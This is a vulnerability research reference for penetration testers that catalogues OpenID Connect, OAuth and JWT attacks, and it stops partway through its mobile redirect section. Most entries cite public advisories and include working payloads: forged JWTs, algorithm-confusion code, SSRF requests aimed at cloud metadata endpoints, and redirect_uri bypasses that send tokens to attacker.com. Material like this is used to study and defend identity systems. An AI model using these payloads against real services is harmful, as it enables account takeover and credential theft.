# OIDC Attack Techniques — Vulnerability Research Reference

> **Audience:** Penetration testers, bug bounty hunters, red team operators  
> **Scope:** OpenID Connect (OIDC) protocol vulnerabilities, JWT attacks, provider misconfigurations, and cloud-native identity federation bypasses  
> **Date:** 2026-05-02  
> **Confidence:** All techniques are confirmed via CVEs, GitHub advisories, or peer-reviewed research

---

## Table of Contents

1. [Discovery & Protocol Attacks](#1-discovery--protocol-attacks)
2. [ID Token / JWT Attacks](#2-id-token--jwt-attacks)
3. [Authorization Code Flow & PKCE](#3-authorization-code-flow--pkce)
4. [UserInfo, Claims & Request Objects](#4-userinfo-claims--request-objects)
5. [Session Management & Logout](#5-session-management--logout)
6. [Relying Party & Client Registration](#6-relying-party--client-registration)
7. [Provider Misconfigurations](#7-provider-misconfigurations)
8. [Cloud-Native & DevOps](#8-cloud-native--devops)
9. [Obscure Edge Cases & Spec Abuse](#9-obscure-edge-cases--spec-abuse)
10. [Historical CVEs & Real-World Breaches](#10-historical-cves--real-world-breaches)

---

## 1. Discovery & Protocol Attacks

### OIDC-CORE-001: JWT Issuer Validation Bypass via Self-Hosted OIDC Discovery

**Risk:** Critical — Complete authentication bypass via token forgery

When a Relying Party (RP) dynamically resolves the JWKS endpoint by extracting the `iss` claim from an incoming JWT without validating the issuer against an allow-list, an attacker can host their own OIDC server and forge tokens for any user.

**Vulnerable Pattern:**
```python
# Unity Catalog CVE-2026-27478
issuer = jwt.decode(token, verify=False)["iss"]
config = requests.get(f"{issuer}/.well-known/openid-configuration").json()
jwks = requests.get(config["jwks_uri"]).json()
# Validates signature against attacker-controlled JWKS
```

**Exploit:**
```python
# Attacker hosts /.well-known/openid-configuration on localhost:8888
# Forges JWT with iss=http://localhost:8888, sub=victim@corp.com
# Exchanges for valid internal access token
```

**Ref:** Lukas Reining (Unity Catalog GHSA-qqcj-rghw-829x) — 2026-03-11

```json
{
  "id": "OIDC-CORE-001",
  "category": "discovery",
  "title": "JWT Issuer Validation Bypass via Self-Hosted OIDC Discovery",
  "source": [{"url": "https://github.com/unitycatalog/unitycatalog/security/advisories/GHSA-qqcj-rghw-829x", "author": "lukas-reining", "date": "2026-03-11"}],
  "confidence": "confirmed",
  "example": "Attacker hosts /.well-known/openid-configuration, forges JWT with attacker-controlled iss, exchanges for valid access token"
}
```

---

### OIDC-CORE-002: Malicious Endpoints Attack via Poisoned Discovery Document

**Risk:** High — Token theft via endpoint substitution

An attacker poisons the OIDC Discovery document to redirect the RP to attacker-controlled token/userinfo endpoints while preserving a legitimate authorization endpoint. After the user authenticates legitimately, the client sends the authorization code to the attacker's token endpoint.

**Malicious Discovery Document:**
```json
{
  "issuer": "http://malicious.com",
  "authorization_endpoint": "https://login.honestOP.com/auth",
  "token_endpoint": "http://malicious.com/steal",
  "userinfo_endpoint": "http://malicious.com/steal"
}
```

**Ref:** Vladislav Mladenov, Christian Mainka (Ruhr University Bochum) — 2015-10-05

```json
{
  "id": "OIDC-CORE-002",
  "category": "discovery",
  "title": "Malicious Endpoints Attack via Poisoned Discovery Document",
  "source": [{"url": "https://web-in-security.blogspot.com/2015/10/attacking-openid-connect-10-malicious.html", "author": "Mladenov, Mainka", "date": "2015-10-05"}],
  "confidence": "confirmed",
  "example": "Discovery doc returns honest auth endpoint but malicious token_endpoint; client leaks code+credentials to attacker"
}
```

---

### OIDC-CORE-003: SSRF via OIDC Discovery, Dynamic Registration, and request_uri

**Risk:** Critical — Internal network reconnaissance and cloud metadata exfiltration

OIDC implementations trigger server-side HTTP requests to URLs derived from attacker-controlled input: `request_uri`, `jwks_uri`, `logo_uri`, `sector_identifier_uri`.

**Keycloak CVE-2020-10770:**
```http
GET /auth?request_uri=http://127.0.0.1:22 HTTP/1.1
```
Blind SSRF allowing localhost port scanning.

**Dynamic Registration Second-Order SSRF:**
```json
{
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```
Server fetches logo during consent page render, exfiltrating AWS credentials.

**Ref:** Lauritz Holtmann (RUB-NDS), Doyensec — 2020-11-10

```json
{
  "id": "OIDC-CORE-003",
  "category": "protocol",
  "title": "SSRF via OIDC Discovery, Dynamic Registration, and request_uri",
  "source": [{"url": "https://security.lauritz-holtmann.de/post/sso-security-ssrf/", "author": "Lauritz Holtmann", "date": "2020-11-10"}],
  "confidence": "confirmed",
  "example": "Keycloak request_uri=http://127.0.0.1:22 causes blind SSRF; logo_uri to 169.254.169.254 exfiltrates cloud credentials"
}
```

---

### OIDC-CORE-004: response_type / response_mode Chaining for Token Theft

**Risk:** Critical — Complete token theft via implicit flow downgrade

Chaining weak `redirect_uri` validation with acceptance of unauthorized `response_type` and `response_mode` allows forcing implicit flow and delivering tokens via auto-submitting HTML form.

**Attack Request:**
```http
GET /authorize?
  redirect_uri=https://attacker.com/callback
  &response_type=id_token+token
  &response_mode=form_post
  &client_id=CLIENT_ID
  &scope=openid+profile+email
```

**Server Response (auto-submit form):**
```html
<form method="post" action="https://attacker.com/callback">
  <input type="hidden" name="access_token" value="TOKEN">
  <input type="hidden" name="id_token" value="ID_TOKEN">
</form>
<script>document.forms[0].submit();</script>
```

**Ref:** Secora Consulting — 2026-04-13

```json
{
  "id": "OIDC-CORE-004",
  "category": "protocol",
  "title": "Chaining response_type and response_mode Manipulation for Token Theft",
  "source": [{"url": "https://secoraconsulting.com/blog/chaining-oidc-misconfigurations-for-token-theft/", "author": "Brian / Secora Consulting", "date": "2026-04-13"}],
  "confidence": "confirmed",
  "example": "response_type=id_token+token + response_mode=form_post + weak redirect_uri allows token theft via POST"
}
```

---

### OIDC-CORE-005: Scope Injection and Upgrade

**Risk:** High — Privilege escalation via scope manipulation

When the authorization server fails to bind the granted scope to the authorization code, attackers can manipulate the `scope` parameter to escalate privileges.

**Authorization Request Scope Upgrade:**
```http
GET /authorize?scope=openid+admin+user:delete
```

**Refresh Token Scope Escalation:**
```http
POST /token
grant_type=refresh_token
&refresh_token=TOKEN
&scope=admin+openid+profile+email
```

**Ref:** PortSwigger Research, Spring Security CVE-2022-31690

```json
{
  "id": "OIDC-CORE-005",
  "category": "protocol",
  "title": "Scope Injection and Upgrade in Authorization and Token Requests",
  "source": [{"url": "https://portswigger.net/web-security/oauth", "author": "PortSwigger", "date": "N/A"}],
  "confidence": "confirmed",
  "example": "Attacker adds admin scope to authorization or refresh request; server issues token with elevated privileges"
}
```

---

### OIDC-CORE-006: acr_values Manipulation and Authentication Downgrade

**Risk:** High — 2FA bypass via authentication method downgrade

If the IdP accepts arbitrary `acr_values`, attackers can switch from strong MFA methods (TOTP) to weaker methods (SMS) that may not be exposed in the UI but are internally enabled.

**Attack:**
```http
GET /authorize?acr_values=sms+password
```
vs.
```http
GET /authorize?acr_values=otp+password
```

**Keycloak Bug:** Multiple `acr_values` (`gold silver`) caused selection of lowest LoA instead of highest.

**Ref:** youst.in bug bounty (2021), Keycloak issue #31534

```json
{
  "id": "OIDC-CORE-006",
  "category": "protocol",
  "title": "acr_values Manipulation and Authentication Downgrade",
  "source": [{"url": "https://youst.in/posts/bypassing-2fa-using-openid-misconfiguration/", "author": "youst.in", "date": "2021-06-11"}],
  "confidence": "confirmed",
  "example": "Switching acr_values from otp+password to sms+password bypasses Google Authenticator 2FA"
}
```

---

### OIDC-CORE-007: Claims Parameter Injection in OpenAM

**Risk:** Critical — Account takeover via claim forgery

OpenAM with `claims_parameter_supported` enabled allowed attackers to inject arbitrary claim values into `id_token` and `user_info` responses.

**CVE-2025-64099:**
```http
GET /oauth2/authorize?
  claims={"id_token":{"email":{"value":"victim@target.com"}}}
```

**Ref:** OpenIdentityPlatform GHSA-39hr-239p-fhqc — 2025-11-12

```json
{
  "id": "OIDC-CORE-007",
  "category": "protocol",
  "title": "Claims Parameter Injection in OpenAM id_token and user_info",
  "source": [{"url": "https://github.com/OpenIdentityPlatform/OpenAM/security/advisories/GHSA-39hr-239p-fhqc", "author": "OpenIdentityPlatform", "date": "2025-11-12"}],
  "confidence": "confirmed",
  "example": "claims={\"id_token\":{\"email\":{\"value\":\"victim@target.com\"}}} forges email claim, leading to account takeover"
}
```

---

### OIDC-CORE-008: Nonce Bypass and Forged JWT Replay in Implicit Flow

**Risk:** Critical — Authentication bypass via token replay

If the client fails to validate the `nonce` claim or skips signature verification entirely, attackers can replay stolen ID Tokens or forge new ones.

**OpenOLAT GHSA-v8vp-x4q4-2vch:** `JSONWebToken.parse()` silently discarded the signature segment. Only claim-level fields were validated.

**Forged JWT:**
```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsIm5vbmNlIjoiQ0FwdHVyZWROb25jZSJ9.dummy
```

**Ref:** OpenOLAT Security Advisory, PortSwigger Lab

```json
{
  "id": "OIDC-CORE-008",
  "category": "protocol",
  "title": "Nonce Bypass and Forged JWT Replay in Implicit Flow",
  "source": [{"url": "https://github.com/OpenOLAT/OpenOLAT/security/advisories/GHSA-v8vp-x4q4-2vch", "author": "OpenOLAT", "date": "N/A"}],
  "confidence": "confirmed",
  "example": "JSONWebToken.parse() discards signature; attacker forges JWT with arbitrary sub and gains admin session"
}
```

---

## 2. ID Token / JWT Attacks

### OIDC-JWT-001: RS256 to HS256 Algorithm Confusion

**Risk:** Critical — Complete signature bypass via key confusion

When a server uses RS256 (asymmetric) but does not pin the algorithm during verification, an attacker changes the header to `alg: HS256` and signs with the server's own RSA public key as the HMAC secret.

**Python Exploit:**
```python
forged = jwt.encode(
    {'sub': 'administrator', 'role': 'admin'},
    key=public_key_pem,  # Server's RSA public key
    algorithm='HS256',
    headers={'alg': 'HS256'}
)
```

**Ref:** PortSwigger, WorkOS — 2026-04-08

```json
{
  "id": "OIDC-JWT-001",
  "category": "signature",
  "title": "RS256 to HS256 Algorithm Confusion",
  "source": [{"url": "https://portswigger.net/web-security/jwt/algorithm-confusion", "author": "PortSwigger", "date": "N/A"}],
  "confidence": "confirmed",
  "example": "jwt.encode with server's public key as HMAC secret, alg=HS256 header"
}
```

---

### OIDC-JWT-002: alg:none Signature Stripping Bypass

**Risk:** Critical — Signature bypass via algorithm removal

If the verifier accepts `alg: none` without an explicit allowlist, attackers strip the signature, modify claims arbitrarily, and the server accepts the token.

**Payload:**
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
```

**Case variants to bypass weak blocklists:** `None`, `NONE`, `nOnE`

**Ref:** Authlib CVE-2026-28498 (GHSA-m344-f55w-2m6j), Lorikeet Security — 2026-04-09

```json
{
  "id": "OIDC-JWT-002",
  "category": "signature",
  "title": "alg:none Signature Stripping Bypass",
  "source": [{"url": "https://lorikeetsecurity.com/blog/oauth-oidc-security-vulnerabilities", "author": "Lorikeet Security", "date": "2026-04-09"}],
  "confidence": "confirmed",
  "example": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."
}
```

---

### OIDC-JWT-003: JKU Header Injection (Self-Hosted JWKS)

**Risk:** Critical — Signature bypass via attacker-controlled key server

The `jku` header tells the verifier where to fetch the JWKS. If the server fetches from attacker-controlled URLs without allowlist validation, the attacker hosts their own JWKS with their public key.

**Attack:**
```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json",
  "kid": "attacker-key-id"
}
```

**Ref:** PortSwigger Lab, Invicti

```json
{
  "id": "OIDC-JWT-003",
  "category": "jwt",
  "title": "JKU Header Injection (Self-Hosted JWKS)",
  "source": [{"url": "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection", "author": "PortSwigger", "date": "N/A"}],
  "confidence": "confirmed",
  "example": "jku: https://attacker.com/jwks.json + self-signed RS256 token"
}
```

---

### OIDC-JWT-004: Embedded JWK Header Injection

**Risk:** Critical — Signature bypass via inline public key

The `jwk` header embeds the public key directly inside the JWT. If the verifier uses this embedded key without validating against a trusted store, attackers generate their own keypair and embed the public key.

**Python:**
```python
jwk = {"kty": "RSA", "kid": "injected", "n": "...", "e": "AQAB"}
forged = jwt.encode({"sub": "admin"}, private_key, headers={'jwk': jwk})
```

**Ref:** Incendium, WorkOS

```json
{
  "id": "OIDC-JWT-004",
  "category": "jwt",
  "title": "Embedded JWK Header Injection",
  "source": [{"url": "https://notes.incendium.rocks/pentesting-notes/web/jwt", "author": "Incendium", "date": "N/A"}],
  "confidence": "confirmed",
  "example": "JWT header contains attacker-generated jwk; server verifies with embedded key"
}
```

---

### OIDC-JWT-005: KID Manipulation (Path Traversal / SQL Injection)

**Risk:** Critical — Key injection via unsafe key ID handling

If `kid` is used unsafely in filesystem paths or SQL queries, attackers can manipulate it to load known keys or inject SQL.

**Path Traversal to /dev/null:**
```json
{"alg": "HS256", "kid": "../../../../../../../dev/null"}
```
Sign with empty string secret (`""`).

**SQL Injection:**
```json
{"kid": "x' UNION SELECT 'attacker_secret' --"}
```
Sign with `attacker_secret`.

**Ref:** Invicti, 4ykh4n Security — 2026-02-19

```json
{
  "id": "OIDC-JWT-005",
  "category": "jwt",
  "title": "KID Manipulation (Path Traversal / SQL Injection)",
  "source": [{"url": "https://www.invicti.com/web-application-vulnerabilities/jwt-signature-bypass-via-kid-path-traversal", "author": "Invicti", "date": "N/A"}],
  "confidence": "confirmed",
  "example": "kid=../../../../../../../dev/null + sign with empty HMAC secret"
}
```

---

### OIDC-JWT-006: Psychic Signatures — CVE-2022-21449 (Java ECDSA Bypass)

**Risk:** Critical — Universal signature forgery on vulnerable Java versions

Java 15–18 before April 2022 CPU did not check that ECDSA signature `r` and `s` values were non-zero. A signature with both values as zero is accepted as valid for any message and any public key.

**Payload:**
```text
eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJCb2IifQ.MAYCAQACAQA
```

**Ref:** Neil Madden (ForgeRock) — 2022-04-19

```json
{
  "id": "OIDC-JWT-006",
  "category": "signature",
  "title": "Psychic Signatures — CVE-2022-21449 (Java ECDSA Bypass)",
  "source": [{"url": "https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/", "author": "Neil Madden", "date": "2022-04-19"}],
  "confidence": "confirmed",
  "example": "eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJCb2IifQ.MAYCAQACAQA → accepted on Java 17.0.2"
}
```

---

### OIDC-JWT-007: Unknown Algorithm Fallback Bypass

**Risk:** Critical — Signature bypass via unhandled algorithm

If JWT verification contains a `switch` with a `default` case that returns `true`, any unknown algorithm bypasses verification entirely.

**Tomcat OIDC Authenticator (2.0.0–2.5.0):**
```java
default:
    this.log.warn("unsupported algorithm \"" + sigAlg + "\", skipping signature verification");
    return true;  // BYPASS
```

**Payload:** `alg: ernw`

**Ref:** ERNW (Malte Heinzelmann) — 2026-02-17

```json
{
  "id": "OIDC-JWT-007",
  "category": "signature",
  "title": "Unknown Algorithm Fallback Bypass",
  "source": [{"url": "https://insinuator.net/2026/02/jwt-authentication-bypass-in-openid-connect-authenticator-for-tomcat/", "author": "Malte Heinzelmann", "date": "2026-02-17"}],
  "confidence": "confirmed",
  "example": "alg='ernw' → default case returns true → signature skipped"
}
```

---

### OIDC-JWT-008: Token Substitution (ID Token as Access Token)

**Risk:** High — Authentication bypass via token type confusion

If the resource server does not validate the `typ` header or token type claims, an attacker can present an ID Token where an Access Token is expected. Both verify against the same JWKS.

**Attack:** Send ID Token (typ=JWT) to API expecting Access Token (typ=at+jwt).

**Ref:** Lorikeet Security, Pingiskok

```json
{
  "id": "OIDC-JWT-008",
  "category": "validation",
  "title": "Token Substitution / ID Token as Access Token",
  "source": [{"url": "https://lorikeetsecurity.com/blog/oauth-oidc-security-vulnerabilities", "author": "Lorikeet Security", "date": "2026-04-09"}],
  "confidence": "confirmed",
  "example": "Send ID Token to API expecting Access Token; accepted if typ not validated"
}
```

---

## 3. Authorization Code Flow & PKCE

### OIDC-FLOW-001: PKCE Downgrade / Optional Verifier Bypass

**Risk:** High — Authorization code interception

PKCE is only effective when the server enforces it. If the server accepts token exchange without `code_verifier` even when `code_challenge` was provided, attackers intercept the code and exchange it without the verifier.

**Authentik CVE-2023-48228:**
```http
# Attacker initiates with code_challenge=S256
# Intercepts authorization code
# Exchanges code WITHOUT code_verifier
# Server returns access token
```

**Ref:** Offensity (Denis Arnst) — 2024-06-10

```json
{
  "id": "OIDC-FLOW-001",
  "category": "pkce",
  "title": "PKCE Downgrade / Optional Verifier Bypass",
  "source": [{"url": "https://www.offensity.com/en/blog/uncovering-a-critical-vulnerability-in-authentiks-pkce-implementation-cve-2023-48228/", "author": "Denis Arnst", "date": "2024-06-10"}],
  "confidence": "confirmed",
  "example": "Authentik accepted token exchange without code_verifier even when flow started with code_challenge"
}
```

---

### OIDC-FLOW-002: Attacker-Controlled PKCE Challenge

**Risk:** High — Token theft via SSO framing

If an attacker controls the page opening the SSO (iframe/popup), they can supply their own `codeChallenge`, know the corresponding `codeVerifier`, and intercept the authorization code to exchange for a session JWT.

**Ref:** Trace37 Labs — 2026-02-27

```json
{
  "id": "OIDC-FLOW-002",
  "category": "pkce",
  "title": "Attacker-Controlled PKCE Challenge via SSO Framing",
  "source": [{"url": "https://labs.trace37.com/blog/pkce-bypass-oauth-account-takeover/", "author": "Trace37 Labs", "date": "2026-02-27"}],
  "confidence": "confirmed",
  "example": "Attacker opens SSO in controlled iframe, supplies their codeChallenge, intercepts code, exchanges with known verifier"
}
```

---

### OIDC-FLOW-003: State Parameter Bypass

**Risk:** Medium — CSRF on authorization request

If the server does not validate the `state` parameter or allows predictable values, attackers can perform CSRF attacks by tricking users into initiating authorization flows.

**Ref:** PortSwigger Research

```json
{
  "id": "OIDC-FLOW-003",
  "category": "state",
  "title": "State Parameter Bypass / CSRF on Authorization",
  "source": [{"url": "https://portswigger.net/web-security/oauth", "author": "PortSwigger", "date": "N/A"}],
  "confidence": "confirmed",
  "example": "Missing or predictable state parameter allows authorization CSRF"
}
```

---

### OIDC-FLOW-004: Code Replay / Reuse

**Risk:** Medium — Token theft via authorization code reuse

If the authorization server does not invalidate the code after first use, attackers can replay the same code to obtain multiple access tokens.

**Ref:** OAuth 2.0 Security Best Current Practice

```json
{
  "id": "OIDC-FLOW-004",
  "category": "code-flow",
  "title": "Authorization Code Replay / Reuse",
  "source": [{"url": "https://datatracker.ietf.org/doc/html/rfc6819", "author": "IETF", "date": "2013-11"}],
  "confidence": "confirmed",
  "example": "Server does not invalidate code after first use; attacker replays to get multiple tokens"
}
```

---

## 4. UserInfo, Claims & Request Objects

### OIDC-USERINFO-001: UserInfo Endpoint Token Substitution

**Risk:** High — Account takeover via sub claim mismatch

The UserInfo response is not cryptographically bound to the ID Token. If the RP does not verify that the `sub` claim in UserInfo exactly matches the `sub` in the ID Token, attackers can substitute tokens.

**Attack:**
1. Attacker obtains victim's access token
2. Attacker initiates OIDC login as themselves
3. Attacker substitutes victim's access token when calling UserInfo endpoint
4. RP accepts UserInfo response without validating sub match

**Ref:** OIDC Core §16.11, Spring Security #10351

```json
{
  "id": "OIDC-USERINFO-001",
  "category": "userinfo",
  "title": "UserInfo Endpoint Token Substitution / Confused Deputy",
  "source": [{"url": "https://openid.net/specs/openid-connect-core-1_0.html#TokenSubstitution", "author": "OpenID Foundation", "date": "2023-12-15"}],
  "confidence": "confirmed",
  "example": "Attacker substitutes victim's access token at UserInfo endpoint; RP accepts without sub validation"
}
```

---

### OIDC-USERINFO-002: False Identifier Anti-Pattern (Email Claim Takeover)

**Risk:** High — Account takeover via mutable identifier

Using `email` as a primary user identifier is a false identifier anti-pattern. In Azure AD, users can set unverified email addresses. Attackers change their email to victim's address and authenticate via OIDC.

**Microsoft Guidance:** "The sub and iss Claims, used together, are the only Claims that an RP can rely upon as a stable identifier."

**Ref:** Microsoft Entra Blog, OWASP ASVS #1826 — 2023-06-19

```json
{
  "id": "OIDC-USERINFO-002",
  "category": "claims",
  "title": "False Identifier Anti-Pattern — Email/Username Claim Takeover",
  "source": [{"url": "https://techcommunity.microsoft.com/blog/microsoft-entra-blog/the-false-identifier-anti-pattern/3846013", "author": "Pamela Dingle", "date": "2023-06-19"}],
  "confidence": "confirmed",
  "example": "Attacker changes Azure AD email to victim@company.com, logs into RP, RP maps to victim's existing account"
}
```

---

### OIDC-USERINFO-003: Essential Claims Downgrade (ACR)

**Risk:** High — Step-up authentication bypass

When an unknown `acr` value is requested as Essential, some OPs incorrectly complete authentication instead of failing. Keycloak selected lowest LoA when multiple values provided.

**Ref:** Keycloak #8724, RFC 9470

```json
{
  "id": "OIDC-USERINFO-003",
  "category": "claims",
  "title": "Essential Claims Downgrade — ACR & max_age Bypass",
  "source": [{"url": "https://github.com/keycloak/keycloak/issues/8724", "author": "CorneliaLahnsteiner", "date": "2021-11-08"}],
  "confidence": "confirmed",
  "example": "Requesting acr_values=gold silver causes Keycloak to select lowest (silver) instead of highest (gold)"
}
```

---

### OIDC-USERINFO-004: Request Object alg:none Bypass

**Risk:** Critical — Parameter forgery via unsigned JAR

Request Objects (JAR) must be signed. If the library accepts `alg:none`, attackers forge arbitrary request parameters (scope, redirect_uri, claims).

**Ref:** Authlib CVE-2026-28498 (GHSA-m344-f55w-2m6j), Tomcat OIDC Authenticator

```json
{
  "id": "OIDC-USERINFO-004",
  "category": "request-object",
  "title": "Request Object Signing Bypass via alg:none or Unknown Algorithm",
  "source": [{"url": "https://www.armosec.io/blog/authlib-cve-2026-28802-jwt-signature-verification-bypass", "author": "Ben Hirschberg", "date": "2026-03-10"}],
  "confidence": "confirmed",
  "example": "Request Object with alg:none allows forging scope, redirect_uri, claims"
}
```

---

### OIDC-USERINFO-005: Request URI (JARUR) SSRF

**Risk:** Critical — Internal network attack

The `request_uri` parameter instructs the OP to fetch the Request Object from an arbitrary URL. Without whitelist validation, attackers scan internal networks.

**Keycloak CVE-2020-10770:** `request_uri=http://127.0.0.1:22`

**Ref:** Lauritz Holtmann, NIST CVE-2020-10770

```json
{
  "id": "OIDC-USERINFO-005",
  "category": "request-object",
  "title": "Request URI (request_uri) SSRF and Internal Port Scanning",
  "source": [{"url": "https://security.lauritz-holtmann.de/post/sso-security-ssrf/", "author": "Lauritz Holtmann", "date": "2020-11-10"}],
  "confidence": "confirmed",
  "example": "request_uri=http://127.0.0.1:22 causes blind SSRF and port scanning"
}
```

---

### OIDC-USERINFO-006: Aggregated & Distributed Claims Bypass

**Risk:** High — Claim forgery via nested JWT

Aggregated Claims contain nested JWTs. If the RP verifies only the outer OP signature but not the inner Claims Provider signature, attackers inject arbitrary claims.

**Distributed Claims SSRF:** RP makes HTTP request to attacker-controlled endpoint, leaking the bearer token.

**Ref:** OIDC Core §5.6.2

```json
{
  "id": "OIDC-USERINFO-006",
  "category": "claims",
  "title": "Aggregated & Distributed Claims — Nested JWT Signature Bypass and SSRF",
  "source": [{"url": "https://openid.net/specs/openid-connect-core-1_0.html#AggregatedDistributedClaims", "author": "OpenID Foundation", "date": "2023-12-15"}],
  "confidence": "confirmed",
  "example": "RP verifies outer signature but not inner; attacker injects is_admin:true in nested JWT"
}
```

---

## 5. Session Management & Logout

### OIDC-SESSION-001: RP-Initiated Logout Open Redirect

**Risk:** Medium — Phishing via logout redirect

The `post_logout_redirect_uri` parameter allows attackers to redirect users to malicious sites after logout if not validated against an allow-list.

**Ref:** OIDC Core §5.3

```json
{
  "id": "OIDC-SESSION-001",
  "category": "logout",
  "title": "RP-Initiated Logout Open Redirect via post_logout_redirect_uri",
  "source": [{"url": "https://openid.net/specs/openid-connect-core-1_0.html#RPInitiatedLogout", "author": "OpenID Foundation", "date": "2023-12-15"}],
  "confidence": "confirmed",
  "example": "post_logout_redirect_uri not validated against allow-list; user redirected to attacker.com after logout"
}
```

---

### OIDC-SESSION-002: Session Fixation via State Parameter

**Risk:** Medium — Session hijacking

If the authorization server accepts a client-provided `state` parameter without proper binding to the session, attackers can fixate the state and intercept the authorization code.

**Ref:** OAuth 2.0 Security Best Current Practice

```json
{
  "id": "OIDC-SESSION-002",
  "category": "session-management",
  "title": "Session Fixation via State Parameter Manipulation",
  "source": [{"url": "https://datatracker.ietf.org/doc/html/rfc6819", "author": "IETF", "date": "2013-11"}],
  "confidence": "confirmed",
  "example": "Attacker fixes state parameter, intercepts authorization code bound to that state"
}
```

---

### OIDC-SESSION-003: Back-Channel Logout Token Validation Bypass

**Risk:** High — Single sign-out bypass

If the back-channel logout endpoint does not properly validate the `logout_token` signature, audience, or timing, attackers can forge logout requests to terminate victim sessions.

**Ref:** OIDC Back-Channel Logout Specification

```json
{
  "id": "OIDC-SESSION-003",
  "category": "logout",
  "title": "Back-Channel Logout Token Validation Bypass",
  "source": [{"url": "https://openid.net/specs/openid-connect-backchannel-1_0.html", "author": "OpenID Foundation", "date": "2014-11"}],
  "confidence": "confirmed",
  "example": "Server accepts logout_token without proper signature or audience validation; forges logout requests"
}
```

---

## 6. Relying Party & Client Registration

### OIDC-RP-001: Dynamic Client Registration SSRF via URL Metadata Fields

**Risk:** Critical — Cloud metadata theft, internal network reconnaissance

Dynamic Client Registration (RFC 7591) allows clients to self-register by POSTing JSON metadata. Several fields accept arbitrary URLs that the AS may fetch server-side either immediately or lazily during subsequent flows:

| Field | When fetched | Typical SSRF trigger |
|-------|--------------|----------------------|
| `logo_uri` | When the consent page renders the client logo | Visiting `/client/{id}/logo` or the authorize page |
| `jwks_uri` | When the client authenticates with `private_key_jwt` | Token endpoint request with `client_assertion` |
| `sector_identifier_uri` | When the AS needs the canonical redirect URI list | Authorization request for the registered client |
| `request_uris` | During authorization if `request_uri` is used | Authorization request referencing a pre-registered URI |

**PortSwigger black-box flow:** discover `registration_endpoint` from `/.well-known/openid-configuration`, register with `logo_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/`, complete an authorization flow so the consent page renders the logo, then `GET /client/{client_id}/logo` to retrieve cloud credentials.

**Keycloak CVE-2026-1180:** attacker registers `jwks_uri=http://internal:8080`; during `private_key_jwt` client authentication, Keycloak performs a blind SSRF to the attacker-supplied `jwks_uri`, enabling internal port scanning via timing/error side-channels.

```json
{
  "id": "OIDC-RP-001",
  "category": "client-registration",
  "title": "SSRF via Dynamic Client Registration URL metadata fields",
  "source": [
    {"url": "https://portswigger.net/research/hidden-oauth-attack-vectors", "author": "PortSwigger Research", "date": "2021-03-24"},
    {"url": "https://github.com/keycloak/keycloak/issues/45645", "author": "abstractj / Keycloak Security (CVE-2026-1180)", "date": "2026-01-21"}
  ],
  "confidence": "confirmed",
  "example": "POST /connect/register with logo_uri=http://169.254.169.254/...; AS fetches the URL during consent rendering, leaking cloud metadata."
}
```

---

### OIDC-RP-002: Redirect URI Path Traversal Chained with Open Redirect

**Risk:** High — Authorization code / access token theft

Even when an AS blocks arbitrary external domains in `redirect_uri`, it may still allow path traversal sequences or appended query parameters on the registered host. If the registered client domain also hosts an open redirect, the attacker chains the two flaws to exfiltrate the authorization response.

**PortSwigger Lab flow:**
1. Legitimate `redirect_uri` is `https://target.com/oauth-callback`.
2. AS rejects `https://evil.com` but accepts `redirect_uri=https://target.com/oauth-callback/../post/next?path=https://evil.com/exploit`.
3. `../post/next` is an open redirect on the target site that 302-redirects to `https://evil.com/exploit`.
4. Implicit-flow tokens in the URL fragment (`#access_token=...`) survive 302s — browsers re-attach the fragment to the final attacker URL.
5. Attacker JS reads `window.location.hash` and exfiltrates the token.

**Bypass primitives to test on every `redirect_uri`:** `/../anything`, appended `?next=`/`?url=`/`?redirect=`/`?path=` parameters, HTTP Basic Auth `legit.com:@attacker.com`, IPv6 multi-`@` userinfo.

```json
{
  "id": "OIDC-RP-002",
  "category": "redirect-uri",
  "title": "Authorization code/token theft via path traversal in redirect_uri chained with open redirect",
  "source": [
    {"url": "https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect", "author": "PortSwigger Web Security Academy", "date": "N/A"},
    {"url": "https://dl.acm.org/doi/fullHtml/10.1145/3627106.3627140", "author": "Tommaso Innocenti et al. (ACM CCS '22)", "date": "2022-02-15"}
  ],
  "confidence": "confirmed",
  "example": "redirect_uri=https://target.com/oauth-callback/../post/next?path=https://attacker.com/exploit"
}
```

---

### OIDC-RP-003: Mobile Custom URL Scheme Hijacking

**Risk:** Critical — Mobile OAuth account takeover

Native apps often use custom URI schemes (e.g., `com.example.app://oauth`) as `redirect_uri`. Unlike HTTPS, custom schemes have no centralized registry on Android or iOS — any installed app can declare the same scheme in its manifest and intercept the OAuth grant.

**Android (classic scheme conflict):** malicious app declares the same `<intent-filter>` scheme/host as the victim app. When the AS redirects to `com.target.app://oauth?code=AUTH_CODE`, Android shows a disambiguation dialog (or some OEM skins default to the most recently installed app).

**iOS ASWebAuthenticationSession bypass (Connelly & Ahrens, 2024):**
1. Attacker app opens `ASWebAuthenticationSession` to `evanconnelly.com`.
2. That domain 302-redirects to the victim app's `/authorize?prompt=none`.
3. Because the user is already logged in to Safari, the AS silently issues a code and redirects to the victim's custom-scheme URI.
4. **iOS delivers the custom-scheme redirect to the app that opened the ASWebAuthenticationSession**, even if another app registered that scheme first.
5. Attacker app receives the code and exchanges it for an access token.

**Facebook OAuth host bypass (Ostorlab):** Facebook mobile OAuth uses `fbconnect://cct.{app_id}`. Backend does not validate the host portion of the custom scheme — attacker registers `fbconnect://cct.com.fakespotify.malware` and receives the OAuth grant intended for Spotify because `client_id` is unchanged.

```json
{
  "id": "OIDC-RP-003",
  "category": "redirect-uri",
  "title": "Mobile OAuth account takeover via custom URI scheme hijacking",
  "source": [
    {"url": "https://blog.ostorlab.co/one-scheme-to-rule-them-all.html", "author": "Ostorlab", "date": "N/A"},
    {"url": "https://evanconnelly.github.io/post/ios-oauth/", "author": "Evan Connelly / Julien Ahrens", "date": "2024-06-18"}
  ],
  "confidence": "confirmed",
